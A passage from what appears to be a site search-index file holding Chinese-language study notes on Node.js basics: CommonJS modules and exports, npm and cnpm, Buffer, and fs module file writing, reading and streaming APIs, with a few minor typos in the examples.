<p>\u6267\u884c\u6a21\u5757\u65f6\uff0c\u5b9e\u9645\u4e0a\u5c31\u662f\u628a\u6a21\u5757\u5305\u88f9\u6210\u4e00\u4e2a\u51fd\u6570\uff0c\u90a3\u4e48\u5c31\u6709\u4e86\u51fd\u6570\u7684\u7279\u6027\u3002</p> <pre><code>console.log(arguments); // \u5f53\u524d\u6a21\u5757\u5305\u88f9\u7684\u51fd\u6570\u7684\u53c2\u6570\u4f2a\u6570\u7ec4\nconsole.log(arguments.callee) // \u5f53\u524d\u6267\u884c\u7684\u51fd\u6570\u5bf9\u8c61\nconsole.log(arguments.callee + '') // \u5f53\u524d\u6267\u884c\u7684\u51fd\u6570\u5bf9\u8c61\uff08\u8f6c\u6362\u6210\u5b57\u7b26\u4e32\uff09\n</code></pre> <p>\u5b9e\u9645\u4e0a\u7684\u51fd\u6570</p> <pre><code>function (exports, require, module, __filename, __dirname) {\n  // \u6587\u4ef6\u5185\u90e8\u4ee3\u7801\n}\n</code></pre> <pre><code>// \u4e94\u4e2a\u5b9e\u53c2\u542b\u4e49\nexports // \u5bfc\u51fa\u7684\u53c2\u6570 exports.x = 10;\nrequire // \u5bfc\u5165\u7684\u6a21\u5757\nmodule // \u5f53\u524d\u7684\u6a21\u5757\uff0cexports \u662f module \u7684\u5c5e\u6027 exports === module.exports\n__filename // \u6587\u4ef6\u7684\u7edd\u5bf9\u8def\u5f84\n__dirname // \u6587\u4ef6\u6240\u5728\u76ee\u5f55\u7684\u7edd\u5bf9\u8def\u5f84\n</code></pre>"},{"location":"other/nodeJS-basic-upguigu/#08exports-moduleexports","title":"08.exports \u548c module.exports","text":"<p>\u901a\u8fc7\u4e0a\u9762\u7684\u6a21\u5757\u5316\uff0cExports \u662f module \u7684\u4e00\u4e2a\u5c5e\u6027\uff0cexports === module.exports</p> <p>\u56e0\u4e3a\u6a21\u5757\u662f\u5bf9\u8c61\uff0c\u5c5e\u4e8e\u5f15\u7528\u7c7b\u578b\uff0c\u90a3\u4e48\u76f4\u63a5\u66f4\u6539\u67d0\u4e00\u4e2a\u503c\u662f\u76f8\u540c\u7684\uff0c\u4e0b\u9762\u7b49\u4ef7</p> <pre><code>exports.x = 10;\nmodule.exports.x = 10;\n</code></pre> <p>\u4f46\u662f\u4e0d\u80fd\u6574\u4f53\u66ff\u6362\uff0c\u4e0b\u9762\u7684\u4e0d\u76f8\u7b49\uff0c\u7b2c\u4e00\u4e2a\u5bfc\u51fa\u65e0\u6548</p> <pre><code>exports = { x: 10 }\nmodule.exports = { x: 10 }\n</code></pre> <p>exports \u53ea\u80fd\u4f7f\u7528\u70b9\u8bed\u6cd5\u66b4\u9732\u5185\u90e8\u53d8\u91cf</p> <p>module.exports \u53ef\u4ee5\u901a\u8fc7\u70b9\u8bed\u6cd5\uff0c\u6216\u8005\u76f4\u63a5\u8f93\u51fa\u5bf9\u8c61\uff0c\u6240\u4ee5\u7528\u8fd9\u4e2a\u5c31\u884c\u3002</p> <pre><code>module.exports = {\n  name: 10,\n  age: 20,\n  fn: function() {\n    console.log('hi');\n  }\n};\n</code></pre>"},{"location":"other/nodeJS-basic-upguigu/#09","title":"09.\u5305\u7b80\u4ecb","text":"<p>\u5305 commonJS \u89c4\u5b9a\u6211\u4eec\u53ef\u4ee5\u5c06\u4e00\u7ec4\u6a21\u5757\u653e\u5728\u4e00\u8d77\uff0c\u5f62\u6210\u4e00\u7ec4\u5de5\u5177\uff08\u5b9e\u9645\u5c31\u662f\u4e00\u4e2a\u6587\u4ef6\u5939\uff09</p> <p>\u7ec4\u6210\uff1a\u5305\u7ed3\u6784\uff08\u5404\u79cd\u6587\u4ef6\uff09+\u5305\u63cf\u8ff0\u6587\u4ef6\uff08\u8bf4\u660e\u4e66\uff0cpackage.json\uff09</p> <p>\u5e38\u89c1\u6587\u4ef6\uff1abin lib src doc test</p> <p>Package.json \u4e2d\u5e38\u89c1\u5c5e\u6027\uff08\u4e0d\u8d58\u8ff0\uff09name describe version dependencies</p>"},{"location":"other/nodeJS-basic-upguigu/#10npm","title":"10.npm\u7b80\u4ecb","text":"<p>node package manager \u5305\u7ba1\u7406\u5de5\u5177</p> <pre><code>npm search lodash\nnpm remove lodash\nnpm install lodash --save\nnpm install less-loader --save-dev\nnpm install vue-cli -G\n</code></pre>"},{"location":"other/nodeJS-basic-upguigu/#11cnpm","title":"11.\u914d\u7f6ecnpm","text":"<p>https://npmmirror.com/</p> <p>\u56fd\u5185\u8bbf\u95ee npm \u6bd4\u8f83\u6162\uff0c\u6240\u4ee5\u53ef\u4ee5\u540c\u65f6\u5b89\u88c5 cnpm\uff0c\u548c npm \u4e0d\u51b2\u7a81\uff0c\u4e0d\u540c\u9879\u76ee\u4f7f\u7528\u4e0d\u540c\u7684\u5b89\u88c5\u65b9\u5f0f\uff08\u4f7f\u7528\u65f6\u7528 cnpm\uff09\u66f4\u65b0\u53d1\u5e03\u7248\u672c\u65f6\u4f7f\u7528 npm</p>"},{"location":"other/nodeJS-basic-upguigu/#12node","title":"12.node\u641c\u7d22\u5305\u7684\u6d41\u7a0b","text":"<p>\u9ed8\u8ba4\u4f1a\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u9762\u627e node_modules \u5bfb\u627e\u9700\u8981\u7684\u5305\uff1b\u5982\u679c\u6ca1\u6709\u627e\u5230\uff0c\u90a3\u4e48\u4f1a\u4e00\u76f4\u9012\u5f52\u5230\u6839\u76ee\u5f55\u5bfb\u627e\u8fd9\u4e2a\u5305\u3002</p> <p>\u524d\u9762\u7684\u662f\u51c6\u5907\u5de5\u4f5c\uff0c\u540e\u9762\u6b63\u5f0f nodeJS \u4ecb\u7ecd\uff08\u4e00\u8282\u8bfe\u5f88\u5c11\u7684\u5185\u5bb9\uff09</p>"},{"location":"other/nodeJS-basic-upguigu/#13buffer","title":"13.Buffer\u7f13\u51b2\u533a","text":"<p>JS \u539f\u751f\u6570\u7ec4\u6027\u80fd\u8f83\u5dee\uff08\u5b9e\u9645\u662f\u5bf9\u8c61\u7d22\u5f15\u5b58\u50a8\uff0c\u4e0d\u662f\u8fde\u7eed\u7684\u5185\u5b58\u7a7a\u95f4\uff09\uff1b\u4f20\u7edf\u6570\u7ec4\u4e0d\u80fd\u5b58\u50a8\u591a\u5a92\u4f53\u6587\u4ef6\uff08\u4e8c\u8fdb\u5236\u6587\u4ef6\uff09\u6240\u4ee5\u5f15\u5165\u4e86 buffer</p> <p>Buffer \u7c7b\u4f3c\u6570\u7ec4\uff0c\u6bcf\u4e00\u4e2a\u9879\u662f16\u8fdb\u5236\u7684\u4e24\u4f4d\u6570\uff0c\u8868\u793a\u5185\u5b58\u4e2d\u4e00\u4e2a\u5b57\u8282\u3002Buffer \u901a\u8fc7\u5e95\u5c42 C++ \u7533\u8bf7\u8fde\u7eed\u5185\u5b58\u7a7a\u95f4\u3002</p> <pre><code>var buf = Buffer.from('string');\n// \u628a\u5b57\u7b26\u4e32\u8f6c\u6362\u6210\u4e8c\u8fdb\u5236\uff08unicode\uff09\n// \u67e5\u770b\u5360\u7528\u7684\u5185\u5b58\u7a7a\u95f4\uff08\u5982\u679c\u662f\u82f1\u6587\u5b57\u7b26\uff0c\u4e00\u4e2a\u5b57\u7b26\u5360\u7528\u4e00\u4e2a\u5b57\u8282\uff09\n// \u5982\u679c\u662f\u4e2d\u6587\u6c49\u5b57\uff0c\u4e00\u4e2a\u5b57\u7b26\u5360\u7528\u4e09\u4e2a\u5b57\u8282\n// \u6bcf\u4e00\u4e2a\u5b57\u8282\u7684\u4e24\u4f4d\u6570\u662f\u5341\u516d\u8fdb\u5236\u7684 00 - ff \u5bf9\u5e94\u4e8c\u8fdb\u5236\u7684 00000000 11111111 (0-255)\n</code></pre> <p><code>buf.length</code>; \u8868\u793a\u5360\u7528\u5185\u5b58\u7684\u5927\u5c0f</p> <p>str.length \u8868\u793a\u5b57\u7b26\u4e32\u7684\u957f\u5ea6</p> <p>\u5176\u4ed6\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u5728\u5b98\u7f51\u4e0a\u90fd\u6709</p> <p><code>Buffer.alloc</code> \u521b\u5efa\u4e00\u4e2a\u6307\u5b9a\u957f\u5ea6\u7684\u4e8c\u8fdb\u5236\u6d41\uff08\u5e76\u521d\u59cb\u5316\u4e3a00\uff09</p> <p><code>Buffer.allocUnsafe</code> \u521b\u5efa\u4e00\u4e2a\u6307\u5b9a\u957f\u5ea6\u7684\u4e0d\u5b89\u5168\u7684\u4e8c\u8fdb\u5236\u6d41\uff08\u4e0d\u521d\u59cb\u531600\uff09\u4f7f\u7528\u5df2\u6709\u5185\u5b58\u2014\u2014\u53ef\u80fd\u6709\u4ee5\u524d\u7684\u654f\u611f\u6570\u636e\u3002\u4e0d\u521d\u59cb\u5316\u7684\u8fc7\u7a0b\u6027\u80fd\u66f4\u597d\u3002\u63a8\u8350\u4f7f\u7528 Buffer.alloc \u65b9\u6cd5\u3002</p> <p>\u53ef\u4ee5\u901a\u8fc7\u4e0b\u6807\u6539\u53d8 buffer \u7684\u6570\u636e\uff08\u4e0d\u80fd\u8d85\u8fc7256\uff0c\u8d85\u8fc7\u540e\u5b58\u50a8\u7684\u4e0d\u6b63\u786e\uff09</p> <p>buf[0] = 10;</p> <p>buf[1] = 0xaa;</p> <p>\u8d85\u8fc7\u4e0b\u6807\u957f\u5ea6\u6539\u53d8\u4e8c\u8fdb\u5236\uff0c\u4e0d\u4f1a\u62a5\u9519\uff0c\u4f46\u662f\u4e0d\u4f1a\u5199\u5165</p> <p>console.log(buf[1]) \u5728\u63a7\u5236\u53f0\u8f93\u51fa\u7684\u6570\u503c\u90fd\u662f10\u8fdb\u5236\u6570 170\uff0c\u6216\u8005\u8f6c\u6362\u621016\u8fdb\u5236\u7684\u5b57\u7b26\u4e32\u8f93\u51fa\u3002console.log(buf[1].toString(16))</p> <p>Buffer \u521b\u5efa\u540e\uff0c\u662f\u8fde\u7eed\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u957f\u5ea6\u4e0d\u80fd\u53d8\u5316\uff08JS \u4e2d\u7684 array \u957f\u5ea6\u53ef\u4ee5\u53d8\u5316\uff09\u5982\u679c\u957f\u5ea6\u53ef\u4ee5\u53d8\u5316\uff0c\u90a3\u4e48\u5bf9\u5e94\u7684\u5185\u5b58\u5c31\u662f\u4e0d\u8fde\u7eed\u7684\uff0c\u6027\u80fd\u4e0d\u597d\uff08\u53ef\u80fd\u9700\u8981\u6307\u9488\u6307\u5411\u65b0\u7684\u5185\u5b58\u5730\u5740\uff09</p> <p><code>buf.toString()</code> \u5373\u53ef\u8f6c\u6362\u6210\u5b57\u7b26\u4e32</p> <p>\u5176\u4ed6\u7684 API \u89c1\u5b98\u7f51\u6587\u6863\u3002\u5b9e\u9645\u4e0a\u6211\u4eec\u5f88\u5c11\u76f4\u63a5\u4f7f\u7528 buffer\uff0c\u4e3b\u8981\u4e86\u89e3\u521b\u5efa\u7684\u539f\u7406\u3002</p>"},{"location":"other/nodeJS-basic-upguigu/#14","title":"14.\u540c\u6b65\u6587\u4ef6\u5199\u5165","text":"<p>fs\u2014\u2014file system</p> <p>\u670d\u52a1\u5668\u7684\u672c\u8d28\u5c31\u662f\u628a\u670d\u52a1\u5668\u7684\u4ee3\u7801\u53d1\u9001\u7ed9\u6d4f\u89c8\u5668\uff0c\u6240\u4ee5\u6587\u4ef6\u64cd\u4f5c\u662f\u5fc5\u987b\u7684</p> <p>\u6587\u4ef6\u7684\u64cd\u4f5c\u90fd\u5206\u6210\u4e24\u79cd\u65b9\u5f0f\uff1a\u540c\u6b65\u6216\u8005\u5f02\u6b65\u3002</p> <p>\u540c\u6b65\u64cd\u4f5c\u4f1a\u963b\u585e JS \u7684\u6267\u884c\uff0c\u9700\u8981\u5f53\u524d\u64cd\u4f5c\u6267\u884c\u540e\uff0c\u518d\u6267\u884c\u4e0b\u9762\u7684\u4ee3\u7801\u3002</p> <p>\u5f02\u6b65\u64cd\u4f5c\u9700\u8981\u4f20\u5165\u4e00\u4e2a cb \u51fd\u6570\uff0c\u6267\u884c\u5b8c\u6210\u540e\uff0c\u8c03\u7528\u56de\u8c03\u51fd\u6570\u3002</p> <p>\u540c\u6b65\u65b9\u6cd5\u5e26\u4e00\u4e2a sync\uff0c\u5f02\u6b65\u6ca1\u6709\u5e26\u3002</p> <p>\u4e0b\u9762\u662f\u7b80\u5355\u7684\u540c\u6b65\u7684\u4f8b\u5b50\uff08\u5b9e\u9645\u4e0a\u5c31\u662f\u4e09\u6b65\uff1a\u6253\u5f00\u6587\u4ef6\u3001\u5199\u5165\u6587\u4ef6\u3001\u5173\u95ed\u6587\u4ef6\uff08\u91ca\u653e\u5185\u5b58\uff09\uff09</p> <pre><code>var fs = require('fs');\nvar fd = fs.openSync('test.md', \"w\");\nfs.writeSync(fd, \"hello world\");\nfs.closeSync(fd);\n</code></pre> <p>API</p> <pre><code>fs.openSync(path, flags, mode)\n\npath \u662f\u6253\u5f00\u6587\u4ef6\u7684\u8def\u5f84\uff08\u76f8\u5bf9\u6216\u8005\u7edd\u5bf9\u8def\u5f84\uff09\nFlags \u8868\u793a\u6253\u5f00\u7684\u6a21\u5f0f\uff08r, w\uff09\u5b57\u7b26\u4e32\nmode \u8bbe\u7f6e\u6587\u4ef6\u7684\u64cd\u4f5c\u6743\u9650\uff08\u901a\u5e38\u4e0d\u4f20\u53c2\uff09\n\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u6570\u5b57\u8868\u793a\uff08fd\uff09\u7c7b\u4f3c\u4e8e\u5b9a\u65f6\u5668\u7684\u8fd4\u56de\u503c\uff0c\u4fbf\u4e8e\u64cd\u4f5c\u6253\u5f00\u7684\u6587\u4ef6\n</code></pre> <pre><code>fs.writeSync(fd, content, [start-position], [encoding-type])\n\nfd \u662f\u64cd\u4f5c\u7684\u6587\u4ef6\uff08\u6570\u5b57\uff09\ncontent \u662f\u5199\u5165\u7684\u5b57\u7b26\u4e32\nstart-position \u662f\u5199\u5165\u7684\u8d77\u59cb\u4f4d\u7f6e\uff08\u8fd9\u4e2a\u4f4d\u7f6e\u524d\u9762\u7684\u5199\u51650\uff09\nencoding \u662f\u7f16\u7801\uff08\u9ed8\u8ba4\u662f utf-8\uff09\n</code></pre>"},{"location":"other/nodeJS-basic-upguigu/#15","title":"15.\u5f02\u6b65\u7684\u6587\u4ef6\u5199\u5165","text":"<p>\u540c\u6b65\u4ee3\u7801\u4f1a\u963b\u585e\u540e\u9762\u7684\u7a0b\u5e8f\u6267\u884c\u3002\u5982\u679c\u51fa\u9519\uff0c\u4e0d\u597d\u6392\u67e5\u5904\u7406\uff08\u963b\u6b62\u540e\u9762\u7a0b\u5e8f\u6267\u884c\uff09\uff0c\u53ef\u8bfb\u6027\u8f83\u597d</p> <p>\u5f02\u6b65\u4ee3\u7801\u4e0d\u4f1a\u963b\u585e\u540e\u9762\u7a0b\u5e8f\u6267\u884c\uff0c\u51fa\u9519\u90fd\u5728\u56de\u8c03\u51fd\u6570\u4e2d\u5904\u7406\uff0cnodejs \u57fa\u672c\u662f\u5f02\u6b65\u7684\u3002</p> <pre><code>var fs = require('fs');\n\nfs.open(\"hello.md\", \"w\", function(err, fd) {\n  if (err) {\n    console.err(err);\n  } else {\n    fs.write(fd, 'this is content', function(err) {\n      if (err) {\n        console.log(err);\n      } else {\n        fs.close(fd, function(err) {\n          if (err) console.log(err);\n        })\n      }\n    })\n  }\n})\n</code></pre>"},{"location":"other/nodeJS-basic-upguigu/#16","title":"16.\u7b80\u5355\u6587\u4ef6\u5199\u5165","text":"<p>\u4e0a\u9762\u5199\u5165\u548c\u8bfb\u53d6\u6587\u4ef6\u7684\u64cd\u4f5c\u9700\u8981\u4e09\u6b65\uff1a\u6253\u5f00\uff0c\u5199\u5165\uff0c\u5173\u95ed\uff0c\u64cd\u4f5c\u590d\u6742\u3002\u6211\u4eec\u53ef\u4ee5\u4e00\u6b65\u5199\u5165\uff1a</p> <pre><code>fs.writeFile(file, data, [options], cb);\nfs.writeFileSync(file, data, [options]);\n</code></pre> <ul> <li> <p>file \u8868\u793a\u5199\u5165\u6587\u4ef6\u7684\u8def\u5f84 string/buffer\uff0c\u53ef\u4ee5\u662f\u7edd\u5bf9\u8def\u5f84\u6216\u8005\u76f8\u5bf9\u8def\u5f84</p> </li> <li> <p>data \u662f\u5199\u5165\u7684\u6570\u636e\uff08\u5b57\u7b26\u4e32\u6216\u8005\u6d41\uff09 string/buffer/uint8Array</p> </li> <li> <p>Options \u662f\u5199\u5165\u7684\u8bbe\u7f6e object: encoding: 'utf-8', mode: '0o666', flag: 'w'</p> </li> <li>encoding: \u5982\u679cdata\u662f buffer\uff0c\u90a3\u4e48\u683c\u5f0f\u53ea\u80fd\u662f utf-8 \u5ffd\u7565\u9009\u9879</li> <li>flag \u8868\u793a\u6253\u5f00\u6587\u4ef6\u7684\u6a21\u5f0f\uff1ar \u8868\u793a\u53ea\u8bfb\uff0cw \u8868\u793a\u5199\u5165\uff0ca \u8868\u793a\u8ffd\u52a0\uff08\u4e0d\u5b58\u5728\u4f1a\u521b\u5efa\u6587\u4ef6\uff09\u5176\u4ed6\u6a21\u5f0f\u4f7f\u7528\u8f83\u5c11\u3002fs.writeFile \u5982\u679c\u662f 'w' \u5c31\u4f1a\u8986\u76d6\u539f\u59cb\u7684\u6587\u4ef6\uff01\uff01\uff01</li> <li>cb \u662f\u56de\u8c03\u51fd\u6570\uff0c\u53ea\u6709\u4e00\u4e2a\u53c2\u6570 err</li> </ul> <pre><code>var fs = require('fs');\nfs.writeFile('test.md', '\u8fd9\u662f\u5199\u5165\u7684\u5185\u5bb9', { flag: 'w' }, function(err) {\n  if (err) console.log(err);\n});\n</code></pre>"},{"location":"other/nodeJS-basic-upguigu/#17","title":"17.\u6d41\u5f0f\u6587\u4ef6\u5199\u5165","text":"<p>\u5982\u679c\u662f\u5927\u7684\u591a\u5a92\u4f53\u6587\u4ef6\uff08\u6d41\u5f0f\u6587\u4ef6\uff09\u4e00\u6b21\u6027\u8bfb\u53d6\u5199\u5165\uff0c\u53ef\u80fd\u901f\u5ea6\u6bd4\u8f83\u6162\uff0c\u5185\u5b58\u6ea2\u51fa\u3002</p> <p>\u540c\u6b65\u5199\u5165\uff0c\u5f02\u6b65\u5199\u5165\uff0c\u7b80\u5355\u5199\u5165\u90fd\u4e0d\u9002\u5408\u3002</p> <p>\u6240\u4ee5\u6709\u4e13\u95e8\u7684\u65b9\u6cd5\u5904\u7406\u6d41\u5f0f\u6587\u4ef6\uff08\u521b\u5efa\u4e00\u4e2a\u7ba1\u9053\uff09</p> <pre><code>fs.createReadStream(path, [options]);\nfs.createWriteStream(path, [options]);\n</code></pre> <p>\u521b\u5efa\u5199\u5165\u6d41\u540e\uff0c\u53ef\u4ee5\u591a\u6b21\u5199\u5165\u6587\u4ef6</p> <pre><code>var fs = require('fs');\n\nvar ws = fs.createWriteStream('test.md');\nws.write('test');\nws.write('a');\n\n// \u6d41\u5bf9\u8c61\u53ef\u4ee5\u6dfb\u52a0 open close \u4e8b\u4ef6\uff0c\u76d1\u542c\u6d41\u7684\u6253\u5f00\u548c\u5173\u95ed\n// on \u8868\u793a\u4e8b\u4ef6\u89e6\u53d1\u591a\u6b21\u56de\u8c03\u51fd\u6570\n// once \u8868\u793a\u4e8b\u4ef6\u89e6\u53d1\u4e00\u6b21\u56de\u8c03\u51fd\u6570\uff08\u89e6\u53d1\u540e\u9500\u6bc1\uff0c\u6027\u80fd\u66f4\u9ad8\uff09\n\nws.once('open', function() {\n  console.log('stream is open');\n});\n\nws.once('close', function() {\n  console.log('stream is close');\n});\n\n// \u5173\u95ed\u6d41\uff08\u4e0d\u80fd\u4f7f\u7528 ws.close \u5173\u95ed\uff09\nws.end();\n// end \u662f\u53d1\u9001\u7aef\u5168\u90e8\u6267\u884c\u540e\u624d\u5173\u95ed\uff0cclose \u662f\u63a5\u6536\u7aef\u76f4\u63a5\u5173\u95ed\uff0c\u53ef\u80fd\u8fd8\u6709\u6ca1\u6709\u53d1\u9001\u7684\u6587\u4ef6\n</code></pre> <p>on \u662f\u7ed1\u5b9a\u957f\u671f\u7684\u4e8b\u4ef6</p> <p>once \u662f\u7ed1\u5b9a\u4e00\u6b21\u6267\u884c\u7684\u4e8b\u4ef6\uff08\u6253\u5f00\u6587\u4ef6\uff09</p>"},{"location":"other/nodeJS-basic-upguigu/#18","title":"18.\u7b80\u5355\u6587\u4ef6\u8bfb\u53d6","text":"<p>\u8bfb\u53d6\u6587\u4ef6\u56db\u79cd\u65b9\u6cd5\uff1a\u540c\u6b65\u6587\u4ef6\u8bfb\u53d6\uff0c\u5f02\u6b65\u6587\u4ef6\u8bfb\u53d6\uff0c\u7b80\u5355\u6587\u4ef6\u8bfb\u53d6\uff0c\u6d41\u5f0f\u6587\u4ef6\u8bfb\u53d6</p> <p><code>fs.readFile(path, options, cb)</code></p> <pre><code>fs.readFile('./test.md', {flag: 'r'}, (err, data) =&gt; {\n  if (err) console.log(err);\n  console.log(data);\n  // \u8fd9\u91cc\u9ed8\u8ba4\u8bfb\u53d6\u7684\u7ed3\u679c\u90fd\u662f Buffer\uff08\u5982\u679c\u9700\u8981\u8f6c\u6362\u6210 string\uff0c\u624b\u52a8\u8f6c\u6362\uff09\n  // \u56e0\u4e3a\u5f88\u591a\u6587\u4ef6\u90fd\u662f\u6d41\u6a21\u5f0f\uff0c\u6240\u4ee5\u9700\u8981\u4f7f\u7528\u6d41\n});\n</code></pre>"},{"location":"other/nodeJS-basic-upguigu/#19","title":"19.\u6d41\u5f0f\u6587\u4ef6\u8bfb\u53d6","text":"<pre><code>var fs = require('fs');\n\nvar rs = fs.createReadStream('test.png');\n// \u6211\u4eec\u8fd8\u9700\u8981\u4e00\u4e2a\u53ef\u5199\u6d41\u6765\u63a5\u53d7\u8bfb\u53d6\u5230\u7684\u6587\u4ef6\u5185\u5bb9\nvar ws = fs.createWriteStream('new.png');\n\nrs.once('open', function() {\n  console.log('open read stream');\n});\n\nrs.once('close', function() {\n  console.log('close read stream');\n  // \u6570\u636e\u8bfb\u53d6\u5b8c\u6bd5\uff0c\u5173\u95ed\u53ef\u5199\u6d41\n  ws.end();\n});\n\nws.once('open', () =&gt; {\n  console.log('write stream open');\n});\n\nws.once('close', () =&gt; {\n  console.log('write stream close');\n});\n\n// \u5982\u679c\u9700\u8981\u8bfb\u53d6\u53ef\u8bfb\u6d41\u4e2d\u7684\u6570\u636e\uff0c\u9700\u8981\u7ed9\u53ef\u8bfb\u6d41\u7ed1\u5b9a\u4e00\u4e2a data \u4e8b\u4ef6\uff0c\u5c31\u5f00\u59cb\u81ea\u52a8\u8bfb\u53d6\u6570\u636e\n// \u6bcf\u4e00\u6b21\u6700\u5927\u8bfb\u5230 65532 \u4e2a\u5b57\u8282\u7684\u957f\u5ea6\uff0c\u7136\u540e\u5f00\u59cb\u4e0b\u4e00\u4e2a\u8bfb\u53d6\nrs.on('data', function (data) {\n  console.log(data.length);\n});\n</code></pre> <p>\u4e0a\u9762\u8fd9\u6837\u5199\u592a\u9ebb\u70e6\uff0c\u9700\u8981\u76d1\u542c\u4e0d\u540c\u7684\u4e8b\u4ef6\uff0c\u5176\u5b9e\u53ef\u4ee5\u4f7f\u7528\u7b80\u5355\u7684\u65b9\u6cd5</p> <pre><code>var fs = require('fs');\n\nvar rs = fs.createReadStream();\nvar ws = fs.createWriteStream();\nrs.pipe(ws);\n</code></pre> <p>\u76f4\u63a5\u5c06\u53ef\u8bfb\u6d41\u548c\u53ef\u5199\u6d41\u8fde\u63a5\u8d77\u6765\uff0c\u5373\u53ef\u81ea\u52a8\u8bfb\u5199</p> <p>\u95ee\u9898\uff1a\u5982\u679c\u8bfb\u53d6\u591a\u4e2a\u6587\u4ef6\uff0c\u7136\u540e\u5199\u5165\u4e00\u4e2a\u6587\u4ef6\uff0c\u600e\u4e48\u5904\u7406\u5462\uff1f</p> <pre><code>var fs = require('fs');\n\nvar rs1 = fs.createReadStream('./1.md');\nvar rs2 = fs.createReadStream('./2.md');\nvar ws = fs.createWriteStream('./3.md');\n\n// \u521b\u5efa\u591a\u4e2a\u53ef\u8bfb\u6d41\uff0c\u7136\u540e\u5206\u522b\u5199\u5165\u76ee\u6807\u6587\u4ef6\uff08\u5982\u679c\u662f\u5c0f\u6587\u4ef6\u5199\u5165\u6b63\u5e38\uff0c\u591a\u5a92\u4f53\u6587\u4ef6\u6ca1\u6709\u6d4b\u8bd5\uff09\n// \u56e0\u4e3a\u591a\u5a92\u4f53\u6587\u4ef6\u7684\u5934\u4fe1\u606f\u4e0d\u4e00\u6837\uff0c\u7406\u8bba\u4e0a\u4e0d\u80fd\u76f4\u63a5\u62fc\u63a5\uff08\u53ef\u4ee5\u8bd5\u8bd5\u62fc\u63a5\u4e0d\u540c\u7684ts\u6d41\u6587\u4ef6\uff09\nrs1.pipe(ws);\nrs2.pipe(ws);\n</code></pre> <p>\u53ef\u4ee5\u5c1d\u8bd5\u5199\u6210\u5faa\u73af\u5b9e\u73b0\u62fc\u63a5</p> <pre><code>var fs = require('fs');\nvar ws = fs.createWriteStream('./result.mp4');\n// \u521b\u5efa\u591a\u4e2a\u53ef\u8bfb\u6d41\uff0c\u7136\u540e\u5206\u522b\u5199\u5165\u76ee\u6807\u6587\u4ef6\uff08\u5982\u679c\u662f\u5c0f\u6587\u4ef6\u5199\u5165\u6b63\u5e38\uff0c\u591a\u5a92\u4f53\u6587\u4ef6\u6ca1\u6709\u6d4b\u8bd5\uff09\n// \u56e0\u4e3a\u591a\u5a92\u4f53\u6587\u4ef6\u7684\u5934\u4fe1\u606f\u4e0d\u4e00\u6837\uff0c\u7406\u8bba\u4e0a\u4e0d\u80fd\u76f4\u63a5\u62fc\u63a5\uff08\u53ef\u4ee5\u8bd5\u8bd5\u62fc\u63a5\u4e0d\u540c\u7684ts\u6d41\u6587\u4ef6\uff09\nvar count = 10;\nfor (let i = 0; i &lt; count; i++) {\n  var tmp = fs.createReadStream(`${i}.ts`);\n  tmp.pipe(ws);\n}\n</code></pre>"},{"location":"other/nodeJS-basic-upguigu/#20fs","title":"20.fs\u6a21\u5757\u7684\u5176\u4ed6\u65b9\u6cd5","text":"<p>\u5bf9\u6027\u80fd\u6709\u8981\u6c42\u7684\u65f6\u5019\uff0c\u4f7f\u7528\u5f02\u6b65\uff1b\u5982\u679c\u6ca1\u6709\u8981\u6c42\uff0c\u4f7f\u7528\u540c\u6b65\u5373\u53ef\uff1b\u5177\u4f53\u770b\u6587\u4ef6\u5927\u5c0f\u3002</p>"},{"location":"other/nodeJS-basic-upguigu/#existssync","title":"existsSync \u9a8c\u8bc1\u8def\u5f84","text":"<p>\u9a8c\u8bc1\u8def\u5f84\u662f\u5426\u5b58\u5728\uff08\u5f02\u6b65\u65b9\u6cd5\u5e9f\u5f03\u4e86\uff09</p> <pre><code>fs.existsSync(path);\n\nvar isExists = fs.existsSYnc('test.mp3');\n</code></pre>"},{"location":"other/nodeJS-basic-upguigu/#stat","title":"Stat \u83b7\u53d6\u6587\u4ef6\u4fe1\u606f","text":"<pre><code>fs.stat(path, cb)\nfs.statSync(path)\n\nfs.stat(\"test.ts\", function(err, stat) {\n  if (err) console.log(err);\n  console.log(stat);\n});\n</code></pre> <p>\u5176\u4e2d\u8fd4\u56de\u503c stat \u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u62e5\u6709\u4e0b\u9762\u7684\u5c5e\u6027\u548c\u65b9\u6cd5</p> <pre><code>stats.isFile()\nstats.isDirectory()\nstats.isBlockDevice()\nstats.isSocket()\n\nstats.mode\nstats.ino\n</code></pre>"},{"location":"other/nodeJS-basic-upguigu/#unlink","title":"unlink \u5220\u9664\u6587\u4ef6","text":"<p>\uff08\u53d6\u6d88\u6587\u4ef6\u548c\u78c1\u76d8\u7684\u8fde\u63a5\uff09</p> <pre><code>fs.unlink(path, cb)\nfs.unlinkSync(path)\n</code></pre>"},{"location":"other/nodeJS-basic-upguigu/#readdir","title":"readdir \u5217\u51fa\u6587\u4ef6","text":"<pre><code>fs.readdir(path, [options], cb)\nfs.readdirSync(path, [options])\n\nfs.readdir(path, { encoding: 'utf-8' }, (err, files) =&gt; {\n  console.log(files);\n  // files \u662f\u5b57\u7b26\u4e32\u6570\u7ec4\uff0c\u6bcf\u4e00\u9879\u662f\u6587\u4ef6\u6216\u8005\u6587\u4ef6\u5939\u7684\u540d\u5b57\n});\n</code></pre>"},{"location":"other/nodeJS-basic-upguigu/#truncate","title":"truncate \u622a\u65ad\u6587\u4ef6","text":"<p>\u5c06\u6587\u4ef6\u4fee\u6539\u6210\u6307\u5b9a\u5b57\u8282\u7684\u5927\u5c0f\uff08\u4ece\u7b2c\u4e00\u4e2a\u5230 len \u4e2a\uff09</p> <pre><code>fs.truncate(path, len, cb);\nfs.truncateSync(path, len);\n\n// \u6ce8\u610f\uff1alen \u662f\u5b57\u8282\uff0c\u622a\u53d6\u524d len \u4e2a\u5b57\u8282\uff1b\u5982\u679c\u622a\u65ad\u4e2d\u6587\uff0c\u6700\u540e\u4e00\u4e2a\u6c49\u5b57\u53ef\u80fd\u622a\u53d6\u5230\u4e00\u534a\n</code></pre>"},{"location":"other/nodeJS-basic-upguigu/#mkdir","title":"mkdir \u521b\u5efa\u76ee\u5f55","text":"<pre><code>fs.mkdir(path, [mode], cb);\nfs.mkdirSync(path, [mode]);\n\nfs.mkdirSync('test');\n</code></pre>"},{"location":"other/nodeJS-basic-upguigu/#rmdir","title":"rmdir \u5220\u9664\u76ee\u5f55","text":"<pre><code>fs.rmdir(path, cb)\nfs.rmdirSync(path)\n</code></pre>"},{"location":"other/nodeJS-basic-upguigu/#rename","title":"Rename 